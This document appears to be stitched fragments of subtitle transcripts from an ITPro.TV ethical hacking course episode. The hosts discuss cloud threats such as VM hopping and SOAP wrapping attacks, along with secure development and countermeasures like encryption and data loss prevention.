00:41:09.160\nwe see like a disembodied\nhand floating over here.\n\n897\n00:41:09.160 --> 00:41:09.980\nSo don't do that.\n\n898\n00:41:09.980 --> 00:41:10.940\nAnd then of course, what do you do?\n\n899\n00:41:10.940 --> 00:41:12.650\nYou come along and\ndo the exact thing while I'm-\n\n900\n00:41:12.650 --> 00:41:13.790\n>> I was afraid the little nat was gonna\n\n901\n00:41:13.790 --> 00:41:16.490\nleave my screen and go onto your face-\n>> I appreciate that.\n\n902\n00:41:16.490 --> 00:41:17.330\n>> I was looking out for you.\n\n903\n00:41:17.330 --> 00:41:17.960\n>> Thank you very much.\n\n904\n00:41:17.960 --> 00:41:20.720\nYeah, the buddhist in me thanks you\nvery much for taking care of that.\n\n905\n00:41:20.720 --> 00:41:22.100\nSo what I was just saying was,\n\n906\n00:41:22.100 --> 00:41:24.410\nwe joked around a little bit about\ndevelopers a little early on, right?\n\n907\n00:41:24.410 --> 00:41:27.374\nBut the reality is, and\nit's a very important point to make,\n\n908\n00:41:27.374 --> 00:41:30.175\nthat there is a life cycle,\nwhat we call the SDLC, right?\n\n909\n00:41:30.175 --> 00:41:33.430\nThe system and/or software,\nit depends on what S you're focusing on,\n\n910\n00:41:33.430 --> 00:41:36.700\nbut, generically, the System or\nSoftware Development Life Cycle.\n\n911\n00:41:36.700 --> 00:41:38.460\nWe put another S in front of that for\n\n912\n00:41:38.460 --> 00:41:43.450\na secure SDLC, secure software,\nsecure system development lifecycle.\n\n913\n00:41:43.450 --> 00:41:48.440\nThis is a acknowledged phased approach\nthat is common sense in origin,\n\n914\n00:41:48.440 --> 00:41:50.190\nthat understands how to take a system or\n\n915\n00:41:50.190 --> 00:41:54.290\na piece of software from requirements\ngathering and analysis in the beginning\n\n916\n00:41:54.290 --> 00:41:58.890\nthrough planning, through testing and\ndevelopment, into stage release, and\n\n917\n00:41:58.890 --> 00:42:03.460\nthen ultimately manage use, and\nthen over time, essentially, decommission.\n\n918\n00:42:03.460 --> 00:42:06.010\nThis si the generic thought\nprocess behind the SDLC.\n\n919\n00:42:06.010 --> 00:42:12.090\nIf developers are not vetted in school in\nhow to understand how to implement and\n\n920\n00:42:12.090 --> 00:42:16.460\nto essentially bring in security\nat every phase of that life cycle,\n\n921\n00:42:16.460 --> 00:42:17.610\nthey're gonna do good work.\n\n922\n00:42:17.610 --> 00:42:20.390\nBut the problem is we're gonna have\na hell of a time at the end of it,\n\n923\n00:42:20.390 --> 00:42:24.720\ntrying to figure out how to secure it\nbecause security was not built in, but\n\n924\n00:42:24.720 --> 00:42:26.510\nrather, it has to be bolted on.\n\n925\n00:42:26.510 --> 00:42:30.120\nIf we validate security at\nevery phase of that lifecycle,\n\n926\n00:42:30.120 --> 00:42:33.700\nwhich is the way it should be done,\nwhen we talk about doing secure coding,\n\n927\n00:42:33.700 --> 00:42:36.870\nwe're gonna not only encourage and,\ntherefore, come out the back end\n\n928\n00:42:36.870 --> 00:42:41.300\nwith better solutions for the developers\nto be a partner in our process, but\n\n929\n00:42:41.300 --> 00:42:44.890\nwe're gonna be able to understand how to\nsecure that application, that system,\n\n930\n00:42:44.890 --> 00:42:49.870\nwhatever, in ways that are un-thought of\nbecause we're not able to get there if\n\n931\n00:42:49.870 --> 00:42:53.670\nwe don't do it through a integration but\nrather do it after the fact as a bolt on.\n\n932\n00:42:53.670 --> 00:42:56.830\nBecause it's never as good if you\nhave to add it on afterwards as it is\n\n933\n00:42:56.830 --> 00:42:58.330\nyou build it in from the ground up.\n\n934\n00:42:58.330 --> 00:43:03.530\nSo validating during those phases and\nmaking sure security is there is a great\n\n935\n00:43:03.530 --> 00:43:08.470\nopportunity for us as ethical hackers to\nimpact that process in a positive way.\n\n936\n00:43:08.470 --> 00:43:10.150\nWe wanna make sure we're\nthinking about that.\n\n937\n00:43:10.150 --> 00:43:13.720\nAnd the comments that we've been seeing\nin the chat window about some of that,\n\n938\n00:43:13.720 --> 00:43:16.090\nBen you called that out,\nI want to thank you for that.\n\n939\n00:43:16.090 --> 00:43:18.520\nIt's a very important comment to make,\nright?\n\n940\n00:43:18.520 --> 00:43:19.970\nIt's very, very important for\nus to be aware of that.\n\n941\n00:43:19.970 --> 00:43:21.780\n>> Yeah, and\nin fairness to developers as well,\n\n942\n00:43:21.780 --> 00:43:24.296\nsometimes it's not their choice, right?\n\n943\n00:43:24.296 --> 00:43:26.588\n>> [CROSSTALK]\n>> We want to keep an even keel here,\n\n944\n00:43:26.588 --> 00:43:29.909\nI mean, they're good,\nthey serve a purpose, but\n\n945\n00:43:29.909 --> 00:43:32.380\nwe don't want them to get too cocky.\n\n946\n00:43:32.380 --> 00:43:36.360\n>> Well, sometimes they're not\ngiven the resources, the time,\n\n947\n00:43:36.360 --> 00:43:38.240\nto do what should be done.\n\n948\n00:43:38.240 --> 00:43:41.770\nBecause the stakeholders are like, we need\nit now, we need to make money with this.\n\n949\n00:43:41.770 --> 00:43:43.410\nShort cut it, and get it done.\n\n950\n00:43:43.410 --> 00:43:47.094\n>> Absolutely, and there's a lot of\npressure on all of us to do our job and\n\n951\n00:43:47.094 --> 00:43:49.640\nto do it quickly and\ndo it cost effectively.\n\n952\n00:43:49.640 --> 00:43:52.570\nSame thing with hacker,\nethical hacking and security in general.\n\n953\n00:43:52.570 --> 00:43:56.325\nYou know, hey, I don't wanna hear all\nthe ridiculousness about why it's not\n\n954\n00:43:56.325 --> 00:43:58.710\nhappening, just go figure it out and,\nby the way,\n\n955\n00:43:58.710 --> 00:44:00.740\ndon't spend any money to get it done,\nright?\n\n956\n00:44:00.740 --> 00:44:03.710\nI mean, those are the things that we\noften, unfortunately, struggle with.\n\n957\n00:44:03.710 --> 00:44:05.680\nAnd we gotta think about that and\nbe aware of that.\n\n958\n00:44:05.680 --> 00:44:08.500\nBecause the problem becomes\nthat it may be hard for\n\n959\n00:44:08.500 --> 00:44:11.570\nus to do those things if we're\nnot actually given the time and\n\n960\n00:44:11.570 --> 00:44:14.118\nwe're not given the resources,\nand that can be a problem.\n\n961\n00:44:14.118 --> 00:44:16.760\nThings like side-channel attacks\nagainst virtual machines,\n\n962\n00:44:16.760 --> 00:44:18.310\nwe've talked about these\nas well a little bit.\n\n963\n00:44:18.310 --> 00:44:22.430\nAnd the fact that cross hypervisor\nattacks, and what we call VM jumping or\n\n964\n00:44:22.430 --> 00:44:26.790\nVM hopping or VLAN jumping, VLAN hopping,\nwhere we can move between VMs or\n\n965\n00:44:26.790 --> 00:44:28.610\nbetween VLANs and attack each other.\n\n966\n00:44:29.670 --> 00:44:33.450\nBad actors can use those\nattacks to be able to propagate\n\n967\n00:44:33.450 --> 00:44:36.470\nInformation stealing through\nthe system is a big deal.\n\n968\n00:44:36.470 --> 00:44:38.930\nWe've got to focus on\nthe hypervisor security,\n\n969\n00:44:38.930 --> 00:44:41.430\nfocus on lack of root kits there,\nall that sort of stuff.\n\n970\n00:44:41.430 --> 00:44:46.190\n>> I might go in and purchase some\nservices from a cloud service provider\n\n971\n00:44:46.190 --> 00:44:50.980\njust to get a VM on their equipment and\nthen try to attack that hypervisor\n\n972\n00:44:50.980 --> 00:44:53.880\nfrom there, which could then lead\nme over to other customers VM’s.\n\n973\n00:44:53.880 --> 00:44:56.140\n>> You, sir, you, you are a genius.\n\n974\n00:44:56.140 --> 00:44:58.180\nYou are an insidious cloud professional.\n\n975\n00:44:58.180 --> 00:45:00.180\nI’m gonna start a new certification.\n\n976\n00:45:00.180 --> 00:45:02.710\nInsidious Cloud, ICP,\nInsidious Cloud Professional.\n\n977\n00:45:02.710 --> 00:45:04.190\n>> I like it, I like it.\nCan I be a charter member?\n\n978\n00:45:04.190 --> 00:45:04.890\n>> You can be.\n\n979\n00:45:04.890 --> 00:45:07.290\nYou, and, Pinky and\nthe Brain, and Rick and\n\n980\n00:45:07.290 --> 00:45:11.390\nMorty, all of you will be\nInsidious Cloud Professionals.\n\n981\n00:45:11.390 --> 00:45:13.510\nSo yeah,\nMike makes an excellent point here, right?\n\n982\n00:45:13.510 --> 00:45:17.440\nWhat is gonna prevent a bad actor from\ntaking out an legitimate account on\n\n983\n00:45:17.440 --> 00:45:22.430\na provider's system, to gain advantage by\nbeing on the inside, probing the extent of\n\n984\n00:45:22.430 --> 00:45:25.890\nthose defenses, the logical isolations and\nthe multi tenant environment.\n\n985\n00:45:25.890 --> 00:45:28.970\nThe VLAN, the protections\nthat are on the hypervisor,\n\n986\n00:45:28.970 --> 00:45:32.050\non the host, the ability to\nbe able to walk a cross walk\n\n987\n00:45:32.050 --> 00:45:34.890\nfrom one VM against other\nnetworks by scanning and probing.\n\n988\n00:45:34.890 --> 00:45:40.270\nIf I wanna get into Microsoft's Azure\nFabric, if I wanna get into Amazon's AWS,\n\n989\n00:45:40.270 --> 00:45:43.060\nwhat better way to do it\nthan being on the inside and\n\n990\n00:45:43.060 --> 00:45:45.270\nthen trying to figure out\nfrom there what I can do.\n\n991\n00:45:45.270 --> 00:45:47.970\nGreat way to potentially\npropagate attacks.\n\n992\n00:45:47.970 --> 00:45:48.990\nSo we have to think about this.\n\n993\n00:45:48.990 --> 00:45:52.610\nWe hope the vendor is putting up\nfirewalls right in their systems,\n\n994\n00:45:52.610 --> 00:45:55.420\nwe hope the cloud vendor is doing\nall the things they gotta do.\n\n995\n00:45:55.420 --> 00:45:56.260\nThey're subnetting,\n\n996\n00:45:56.260 --> 00:45:59.350\nthey're VLANing, they're probably\nstacking VLANs, hopefully.\n\n997\n00:45:59.350 --> 00:46:03.210\nPrivate secondary VLANs should be\nused to further segment traffic.\n\n998\n00:46:03.210 --> 00:46:04.470\nAll these things should be going on.\n\n999\n00:46:04.470 --> 00:46:07.340\nContinuous monitoring,\nwe've talked about all this stuff and\n\n1000\n00:46:07.340 --> 00:46:08.870\nwhy this is so important.\n\n1001\n00:46:08.870 --> 00:46:11.130\nEncryption of traffic on the wire.\n\n1002\n00:46:11.130 --> 00:46:14.160\nEncryption of traffic at\nrest in the storage tier.\n\n1003\n00:46:14.160 --> 00:46:16.250\nApplication aware encryption,\n\n1004\n00:46:16.250 --> 00:46:19.380\nencryption that is being used in\napplications that are application aware.\n\n1005\n00:46:19.380 --> 00:46:21.520\nAll this stuff is gonna be important.\n\n1006\n00:46:21.520 --> 00:46:25.670\nThe use of DNSSEC to validate the resource\nrecords, as we've talked about.\n\n1007\n00:46:25.670 --> 00:46:30.140\nThe ability to be able to use\nsecure protocols and to tunnel, but\n\n1008\n00:46:30.140 --> 00:46:34.920\nalso to use secure APIs that are an\nindustry standard that we've talked about.\n\n1009\n00:46:34.920 --> 00:46:36.700\nAll these things are gonna be important.\n\n1010\n00:46:36.700 --> 00:46:37.890\nWhat about rapping attacks?\n\n1011\n00:46:37.890 --> 00:46:40.210\nWe haven't really talked about that one,\nalthough we have, but\n\n1012\n00:46:40.210 --> 00:46:42.220\nwe kind of hinted at it,\nwe haven't talked about it directly.\n\n1013\n00:46:42.220 --> 00:46:45.180\nBut a wrapping attack,\nyou know what a wrapping attack is?\n\n1014\n00:46:45.180 --> 00:46:47.472\n>> I'm not much into rap,\nI'm more of a rock and roll guy.\n\n1015\n00:46:47.472 --> 00:46:48.430\n[LAUGH]\n>> You're more into rock and\n\n1016\n00:46:48.430 --> 00:46:50.140\nroll, no gift wrapping, no?\n\n1017\n00:46:50.140 --> 00:46:53.860\nOkay, so wrapping attacks are essentially\nperformed during the translation\n\n1018\n00:46:53.860 --> 00:46:58.650\nof SOAP messages in the TLS or SSL TLS\nlayer, where attackers duplicate the body\n\n1019\n00:46:58.650 --> 00:47:02.960\nof the message, essentially, and send\nit to the server, propagating that and\n\n1020\n00:47:02.960 --> 00:47:04.790\nthinking that they are a legitimate user.\n\n1021\n00:47:04.790 --> 00:47:08.300\nIn other words, it's a fancy way of\ntalking about a spoof or a masquerade, but\n\n1022\n00:47:08.300 --> 00:47:12.160\nwe give it a formal name, but\nit's happening in the system and\n\n1023\n00:47:12.160 --> 00:47:17.890\nwe're attacking the underlying\narchitecture of SSL TLS translation and,\n\n1024\n00:47:17.890 --> 00:47:21.440\nin this case, one of the APIs that\nare being used, the SOAP APIs.\n\n1025\n00:47:21.440 --> 00:47:23.340\nSo we have to think about this.\n\n1026\n00:47:23.340 --> 00:47:25.540\nAnd this can also be a potential problem.\n\n1027\n00:47:25.540 --> 00:47:27.190\nThis is actually a pretty big deal.\n\n1028\n00:47:27.190 --> 00:47:30.920\nWe actually have issues and concerns with\nregards to this, because, essentially,\n\n1029\n00:47:30.920 --> 00:47:34.570\nwhat can happen is,\nas a illegitimate user, as a bad actor,\n\n1030\n00:47:34.570 --> 00:47:37.730\nI may be able to spoof my way\ninto a system and pretend to be\n\n1031\n00:47:37.730 --> 00:47:41.188\nsomebody who is authorized, gaining access\nto resources through a wrapping attack.\n\n1032\n00:47:41.188 --> 00:47:44.700\nIt can also prove to be a bit\nof a nightmare, shall we say.\n\n1033\n00:47:44.700 --> 00:47:46.270\nA lot actually, right?\n\n1034\n00:47:46.270 --> 00:47:48.650\nSo I mean, these are all things\nto consider and to think about.\n\n1035\n00:47:48.650 --> 00:47:51.940\nSo we are wrapping up our\nconversation about cloud attacks.\n\n1036\n00:47:51.940 --> 00:47:54.730\nWe're still gonna talk a bit about some of\nthe other things that go into this, some\n\n1037\n00:47:54.730 --> 00:47:58.565\ntools, certainly, that we'll throw your\nway and talk about in some controls and\n\n1038\n00:47:58.565 --> 00:48:01.455\ncounter measures, things to still\ndiscuss in an up coming episode.\n\n1039\n00:48:01.455 --> 00:48:05.095\nBut a lot of information,\na lot of things to consider here.\n\n1040\n00:48:05.095 --> 00:48:08.060\nThis is probably one of the biggest\ngrowth areas in IT security today.\n\n1041\n00:48:08.060 --> 00:48:11.390\nIn terms of the cloud,\nvulnerabilities we have to be aware of,\n\n1042\n00:48:11.390 --> 00:48:13.530\nunderlying architecture and technology,\n\n1043\n00:48:13.530 --> 00:48:17.600\nvirtualization's right there with cloud,\nkind of growing, right, side by side.\n\n1044\n00:48:17.600 --> 00:48:19.360\nIf you've got skills in these areas,\n\n1045\n00:48:19.360 --> 00:48:21.830\nyou're gonna be very valuable\nas a certified ethical hacker.\n\n1046\n00:48:21.830 --> 00:48:24.550\nIf you don't, you're gonna be very\nvaluable as you continue to do what\n\n1047\n00:48:24.550 --> 00:48:25.250\nyou do, but\n\n1048\n00:48:25.250 --> 00:48:28.350\nyou can add value to your organization by\nlearning more about these areas as well.\n\n1049\n00:48:28.350 --> 00:48:32.160\n>> Absolutely, all right Adam\ngreat look at Cloud computing and\n\n1050\n00:48:32.160 --> 00:48:35.720\nsome of the threats that we're gonna\nface and we have more to talk about.\n\n1051\n00:48:35.720 --> 00:48:37.210\nWe're going to talk about\nsome of the tools and\n\n1052\n00:48:37.210 --> 00:48:40.670\ntechniques and ways to avoid some of those\nthreats or mitigate some of that risk.\n\n1053\n00:48:40.670 --> 00:48:41.640\nSo we thank you for that.\n\n1054\n00:48:41.640 --> 00:48:43.490\nWe hope everybody out\nthere enjoyed watching.\n\n1055\n00:48:43.490 --> 00:48:46.170\nSigning off for ITPRO.TV,\nI've been your host Mike Rodrick.\n\n1056\n00:48:46.170 --> 00:48:47.020\n>> And I'm Adam Bording.\n\n1057\n00:48:47.020 --> 00:48:48.041\n>> And we'll see you next time.\n\n1058\n00:48:48.041 --> 00:48:54.106\n[MUSIC]\n\n",

00:00:17.680\nI'm your host [LAUGH] Mike Rodrick and\n\n4\n00:00:17.680 --> 00:00:20.815\ntoday we're doing our hand\npuppets behind the head.\n\n5\n00:00:20.815 --> 00:00:24.490\n[LAUGH]\n>> [LAUGH] We're doing CEH Version 9.\n\n6\n00:00:24.490 --> 00:00:26.310\n>> Thought I'd break up the monotony.\n\n7\n00:00:26.310 --> 00:00:28.900\nLook, I'm sorry I was ad-libbing,\nI apologize.\n\n8\n00:00:28.900 --> 00:00:30.290\n>> No, we like it, we like it.\n\n9\n00:00:30.290 --> 00:00:31.040\nWhose line is it?\n\n10\n00:00:31.040 --> 00:00:34.310\nNo.\nWe are doing CEH version nine,\n\n11\n00:00:34.310 --> 00:00:36.460\nbelieve it or not, and\nspecifically in this episode,\n\n12\n00:00:36.460 --> 00:00:39.950\nwe're continuing our\nconversation on cloud computing.\n\n13\n00:00:39.950 --> 00:00:43.340\nWe've taken a look at some of the terms we\nneed to be familiar with when it comes to\n\n14\n00:00:43.340 --> 00:00:44.200\ncloud.\n\n15\n00:00:44.200 --> 00:00:47.270\nWe've also looked at some of\nthe inherent risks that we might\n\n16\n00:00:47.270 --> 00:00:49.260\nface as we migrate out to the cloud or\n\n17\n00:00:49.260 --> 00:00:52.840\nmove things out to the cloud, as well\nas some of the threats that we face.\n\n18\n00:00:52.840 --> 00:00:55.800\nWe're gonna continue on talking\nabout some of those threats.\n\n19\n00:00:55.800 --> 00:00:59.900\nWe're gonna look at some tools we can use\nto try to discover some vulnerabilities in\n\n20\n00:00:59.900 --> 00:01:03.160\nour cloud as well as maybe\nsome countermeasures.\n\n21\n00:01:03.160 --> 00:01:06.520\nWhat things we can do to help\nmitigate some of that risk.\n\n22\n00:01:06.520 --> 00:01:11.100\nAnd here to do all of that for us in\n30 minutes or less is Mr. Adam Gordon.\n\n23\n00:01:11.100 --> 00:01:11.960\nHow you doing, Adam?\n\n24\n00:01:11.960 --> 00:01:13.499\n>> Good.\nSo I was making notes while Mike was\n\n25\n00:01:13.499 --> 00:01:16.559\ntalking cuz I want to make sure that\nwe do all that stuff cuz in 30 minutes,\n\n26\n00:01:16.559 --> 00:01:18.277\nI got news for you, it ain't happening.\n\n27\n00:01:18.277 --> 00:01:19.459\n>> [LAUGH]\n>> But, okay,\n\n28\n00:01:19.459 --> 00:01:21.831\nwe're gonna give it shot anyway,\njust in case and\n\n29\n00:01:21.831 --> 00:01:25.620\nwe'll see how far we can get cuz he gives\na very long laundry list of things to do.\n\n30\n00:01:25.620 --> 00:01:27.430\nSpeaking of laundry lists\nof things we wanna do,\n\n31\n00:01:27.430 --> 00:01:30.752\nat some point I would like to be able to\ngo and take a look at that cloud security\n\n32\n00:01:30.752 --> 00:01:33.330\nalliance [INAUDIBLE] site,\nthe one that we had talked about just so\n\n33\n00:01:33.330 --> 00:01:35.580\nwe can have it at some point and\nwe don't catch off guard.\n\n34\n00:01:35.580 --> 00:01:38.420\nSo we do have an interesting little\nthing we wanna show you with regards to\n\n35\n00:01:38.420 --> 00:01:40.830\nvulnerabilities, the threats\nthat we were talking about.\n\n36\n00:01:40.830 --> 00:01:41.960\nWe're gonnna go back and show you that.\n\n37\n00:01:41.960 --> 00:01:44.680\nBut let's talk about cloud security\nfrom a different perspective.\n\n38\n00:01:44.680 --> 00:01:48.580\nIn our prior episodes, we talked\na lot about the risks, the threats,\n\n39\n00:01:48.580 --> 00:01:52.540\nthe vulnerabilities, the concerns, a lot\nof operational vocabulary of the cloud.\n\n40\n00:01:52.540 --> 00:01:55.320\nWe've given you a very good\noverview of the landscape.\n\n41\n00:01:55.320 --> 00:01:58.619\nBut I'd like to drill down a little\nbit on the control layers,\n\n42\n00:01:58.619 --> 00:02:01.220\nthe countermeasures and\nthe concerns we have and\n\n43\n00:02:01.220 --> 00:02:04.899\nthe ways in which we deal with them and\nkind of break this out for you and\n\n44\n00:02:04.899 --> 00:02:08.342\nwalk down what we apply as counter\nmeasures or controls by area.\n\n45\n00:02:08.342 --> 00:02:11.876\nSo if we think about the application\nlayer and we go down,\n\n46\n00:02:11.876 --> 00:02:15.130\nnot the OSI model all the way down,\nbut similar.\n\n47\n00:02:15.130 --> 00:02:18.230\nStart at the application layer,\nsince I'm looking at the top layer,\n\n48\n00:02:18.230 --> 00:02:20.280\nwhat are we doing with\nthe application stack?\n\n49\n00:02:20.280 --> 00:02:21.730\nWhat kind of information do we have?\n\n50\n00:02:21.730 --> 00:02:23.000\nHow do we manage it?\n\n51\n00:02:23.000 --> 00:02:23.900\nWhat kind of networking,\n\n52\n00:02:23.900 --> 00:02:26.870\nwhat kind of trusted computing,\nwhat's the hardware look like?\n\n53\n00:02:26.870 --> 00:02:28.845\nComputers and storage,\nwhat's the physical layer.\n\n54\n00:02:28.845 --> 00:02:30.420\nAs we look at all of these,\n\n55\n00:02:30.420 --> 00:02:32.420\nwe want to think about controls\nthat we apply at each one.\n\n56\n00:02:32.420 --> 00:02:35.140\nSo, let's start with\nthe application workloads,\n\n57\n00:02:35.140 --> 00:02:38.840\nthe applications running up top, things\nthat we have to think about, things like,\n\n58\n00:02:38.840 --> 00:02:41.630\nand we talked about this in\nthe prior episode, SDLC, right?\n\n59\n00:02:41.630 --> 00:02:45.570\nSoftware and system development lifecycles\nand put an S on the front of that.\n\n60\n00:02:45.570 --> 00:02:49.090\nSecure Software,\nSecure System Development Lifecycles.\n\n61\n00:02:49.090 --> 00:02:51.420\nIf we don't develop applications securely,\n\n62\n00:02:51.420 --> 00:02:53.735\nwe're not gonna be able to\ncreate countermeasures and\n\n63\n00:02:53.735 --> 00:02:58.445\ncontrols that are meaningful in the\napplication stack, thus giving the hacker,\n\n64\n00:02:58.445 --> 00:03:01.755\nthe bad actor, the opportunity to come and\ntake that data from us.\n\n65\n00:03:01.755 --> 00:03:04.495\nIf our applications are not\nencryption aware, for instance,\n\n66\n00:03:04.495 --> 00:03:07.920\nwe're running applications that may be\nfabulous, developers did a great job.\n\n67\n00:03:07.920 --> 00:03:10.690\nBut the problem is that they\ndidn't bake security in.\n\n68\n00:03:10.690 --> 00:03:14.530\nWe may not be able to ensure and safeguard\nthat the data coming out of that app\n\n69\n00:03:14.530 --> 00:03:18.600\nis secure in all three\nstages because data in use,\n\n70\n00:03:18.600 --> 00:03:23.290\ndata on the wire, data at rest,\nall three areas must be encrypted.\n\n71\n00:03:23.290 --> 00:03:25.280\nWe can encrypt data in use.\n\n72\n00:03:25.280 --> 00:03:30.223\nWe're missing one of the three big areas\nthat we can impact security positively in\n\n73\n00:03:30.223 --> 00:03:35.095\nand opening up a potential huge area of\nthreat vectors and operational issues and\n\n74\n00:03:35.095 --> 00:03:38.316\nconcerns that we as defenders\nhave to be aware of, but\n\n75\n00:03:38.316 --> 00:03:41.170\nalso the attackers can take advantage of.\n\n76\n00:03:41.170 --> 00:03:42.370\nIt's gonna be a big issue.\n\n77\n00:03:42.370 --> 00:03:46.670\nThings like binary analysis, scanning,\nall the kind of things that we may do\n\n78\n00:03:46.670 --> 00:03:49.480\nat the code level,\nat the application level to trust.\n\n79\n00:03:49.480 --> 00:03:51.630\nWe may look at SAST, right?\n\n80\n00:03:51.630 --> 00:03:53.540\nStatic applications security testing.\n\n81\n00:03:53.540 --> 00:03:56.580\nDAST, dynamic application\nsecurity testing.\n\n82\n00:03:56.580 --> 00:03:58.650\nMay look at RASP may look at IAST.\n\n83\n00:03:58.650 --> 00:04:03.300\nThere's all these different testing types\nthat we could engage in to validate code.\n\n84\n00:04:03.300 --> 00:04:06.000\nWe may break the code down,\ngo line-by-line doing a SAST, or\n\n85\n00:04:06.000 --> 00:04:08.910\nstatic code review,\nwe may dynamically execute the code,\n\n86\n00:04:08.910 --> 00:04:10.970\nfinding out what it does and how it works.\n\n87\n00:04:10.970 --> 00:04:12.480\nThese are issues, these are things,\n\n88\n00:04:12.480 --> 00:04:16.520\nthese are focal points that we want\nto be considering as ethical hackers.\n\n89\n00:04:16.520 --> 00:04:17.470\nWhat kind of code am I running?\n\n90\n00:04:17.470 --> 00:04:21.680\nWe were just talking about AV offline\nbefore we got started, and which one's\n\n91\n00:04:21.680 --> 00:04:25.080\ngood, and which one do you like and what's\ngonna do this and how's it gonna work.\n\n92\n00:04:25.080 --> 00:04:27.730\nAll that's good but\nall that's stuff's black box code,\n\n93\n00:04:27.730 --> 00:04:29.370\nyou don't know what's going on in there.\n\n94\n00:04:29.370 --> 00:04:32.070\nYou don't even know what those virus\n\n95\n00:04:32.070 --> 00:04:35.210\ndefinitions that you were talking about\nthat are coming down are gonna look like.\n\n96\n00:04:35.210 --> 00:04:38.400\nAll you know if that magically somehow\nyour system doesn't get infected with\n\n97\n00:04:38.400 --> 00:04:41.330\nsoftware that can affect you,\nmalware and things like that.\n\n98\n00:04:41.330 --> 00:04:42.510\nDo you really know how that works?\n\n99\n00:04:42.510 --> 00:04:43.570\nI mean, in theory we know,\n\n100\n00:04:43.570 --> 00:04:48.100\nthe vendor tells us but do you understand\nthe intricacies of heuristic analysis and\n\n101\n00:04:48.100 --> 00:04:52.520\nhow heuristic analysis is going to be able\nto be running in that piece of software?\n\n102\n00:04:52.520 --> 00:04:54.460\nI mean,\nI could explain the theory to you, but\n\n103\n00:04:54.460 --> 00:04:56.330\nthat doesn't mean you know\nhow it's implemented, right?\n\n104\n00:04:56.330 --> 00:04:58.340\nWhat about a polymorphic virus?\n\n105\n00:04:58.340 --> 00:05:01.840\nDo you know how that's gonna change\nitself and how we're gonna then look for\n\n106\n00:05:01.840 --> 00:05:02.990\nthose changes?\n\n107\n00:05:02.990 --> 00:05:05.527\nAgain, I could explain the theory to\nyou and I have, [LAUGH] by the way,\n\n108\n00:05:05.527 --> 00:05:06.220\nin other courses.\n\n109\n00:05:06.220 --> 00:05:10.170\nWe've explained this to you numerous times\nacross the many, many opportunities I've\n\n110\n00:05:10.170 --> 00:05:12.850\nhad and been invited to spend\ntime with you here at IT Pro TV.\n\n111\n00:05:12.850 --> 00:05:15.840\nBut the reality is, it doesn't mean\nyou know how it's implemented.\n\n112\n00:05:15.840 --> 00:05:19.080\nAnd if we don't understand that, we may\nbe missing something very important.\n\n113\n00:05:19.080 --> 00:05:20.770\nThat's just one of the things to consider.\n\n114\n00:05:20.770 --> 00:05:23.990\nInformation, right, the data itself,\nhow are we dealing with this.\n\n115\n00:05:23.990 --> 00:05:26.470\nThings like DLP,\ndata loss prevention, right.\n\n116\n00:05:26.470 --> 00:05:28.110\nReaching into that datastream,\n\n117\n00:05:28.110 --> 00:05:32.420\npulling out information that's been\ntagged as being inappropriate to be sent.\n\n118\n00:05:32.420 --> 00:05:36.300\nI'm not talking about things\nthat are inappropriate from\n\n119\n00:05:36.300 --> 00:05:40.280\nthe pornography perspective, or\nbad language, or inappropriate behavior.\n\n120\n00:05:40.280 --> 00:05:42.350\nThose things are certainly\nnot appropriate,\n\n121\n00:05:42.350 --> 00:05:44.385\nshould not be used on a network,\nshould not be sent.\n\n122\n00:05:44.385 --> 00:05:45.670\nDLP can deal with that.\n\n123\n00:05:45.670 --> 00:05:48.760\nBut what I'm really talking about\nis things that violate PII,\n\n124\n00:05:48.760 --> 00:05:50.990\npersonally identifiable\ninformation protection.\n\n125\n00:05:50.990 --> 00:05:54.890\nAccount information,\nSocial Security Numbers, banking numbers,\n\n126\n00:05:54.890 --> 00:05:59.760\npatient record information,\nthis stuff is the honey pot, right,\n\n127\n00:05:59.760 --> 00:06:02.620\nfor the bad actor,\nthis is the stuff we want, right?\n\n128\n00:06:02.620 --> 00:06:04.960\nThe other stuff,\nI could find that stuff anywhere.\n\n129\n00:06:04.960 --> 00:06:07.710\nI don't need to go to your network and\nfind pornography, right.\n\n130\n00:06:07.710 --> 00:06:09.520\nI could find that out on the Internet and\n\n131\n00:06:09.520 --> 00:06:11.640\nI don't have to work very\nhard if I really want that.\n\n132\n00:06:11.640 --> 00:06:15.750\nWhat the bad actor doesn't want is\nthey don't want stuff that's common,\n\n133\n00:06:15.750 --> 00:06:19.460\nthey don't want stuff that they have to\nwork really hard for that has no value.\n\n134\n00:06:19.460 --> 00:06:22.550\nWhat they do want is they want stuff\nthat's unique, that they can get,\n\n135\n00:06:22.550 --> 00:06:24.460\nand that they can then leverage.\n\n136\n00:06:24.460 --> 00:06:27.810\nAnd account information,\npatient record information,\n\n137\n00:06:27.810 --> 00:06:31.280\ninformation allows me to assume your\nidentity is stuff that they want.\n\n138\n00:06:31.280 --> 00:06:34.060\nDLP Technology can help\nus to prevent that.\n\n139\n00:06:34.060 --> 00:06:38.290\nData app, database activity monitoring or\nwhat we call DAM, D-A-M, right?\n\n140\n00:06:38.290 --> 00:06:41.975\nSo actively monitoring database activity,\nusing encryptions.\n\n141\n00:06:41.975 --> 00:06:46.085\nThese are all mechanisms, these are all\ncountermeasures, these are all controls\n\n142\n00:06:46.085 --> 00:06:49.295\nthat at the information layer,\ndealing with data, would be helpful.\n\n143\n00:06:49.295 --> 00:06:52.787\nNever underestimate encryption,\nwe talked about that being a panacea and\n\n144\n00:06:52.787 --> 00:06:55.267\nthat thing that no matter\nwhere you are and what you do,\n\n145\n00:06:55.267 --> 00:06:58.637\nis a bed rock baseline assumption\nof any security solution, right?\n\n146\n00:06:58.637 --> 00:06:59.167\nNo matter what,\n\n147\n00:06:59.167 --> 00:07:02.137\nalways say that first and foremost,\nlead with encryption as we say, right?\n\n148\n00:07:02.137 --> 00:07:04.187\nLead with encryption,\nyou're always gonna be right.\n\n149\n00:07:04.187 --> 00:07:05.918\nWhat about at the management layer, right?\n\n150\n00:07:05.918 --> 00:07:08.218\nGovernance, risk and compliance,\nhow do we manage that?\n\n151\n00:07:08.218 --> 00:07:10.598\nHow do we implement a good procedure?\n\n152\n00:07:10.598 --> 00:07:12.448\nHow do we validate good process?\n\n153\n00:07:12.448 --> 00:07:15.138\nHow do we have good guidance and\noversight with policy?\n\n154\n00:07:15.138 --> 00:07:17.288\nThat's gonna be critical as well\nto our success in the cloud.\n\n155\n00:07:17.288 --> 00:07:20.494\nIf we're not doing this stuff,\nthen there are holes and liabilities.\n\n156\n00:07:20.494 --> 00:07:23.444\nIf we don't have auditability,\ntraceability, and\n\n157\n00:07:23.444 --> 00:07:27.714\nnot only standardization, we can call that\nreliability through standardization, but\n\n158\n00:07:27.714 --> 00:07:29.374\nwe don't have repeatability, again,\n\n159\n00:07:29.374 --> 00:07:31.430\nanother way of 